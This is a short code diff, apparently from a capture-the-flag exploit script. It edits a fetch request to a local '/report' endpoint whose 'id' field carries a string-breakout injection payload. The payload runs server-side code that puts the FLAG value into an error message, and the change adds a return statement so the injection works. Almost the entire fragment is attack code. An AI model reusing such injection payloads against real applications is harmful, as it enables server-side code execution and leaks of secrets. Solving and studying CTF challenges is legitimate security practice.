@@ -3,7 +3,7 @@ alert("injected");
 fetch("http://localhost/report", {
   method: "POST",
   body: new URLSearchParams({
-    'id': '");res.locals.errormsg = FLAG;//'
+    'id': '");res.locals.errormsg = FLAG;return;//'
   }),
   headers: {
     "Content-Type": "application/x-www-form-urlencoded"
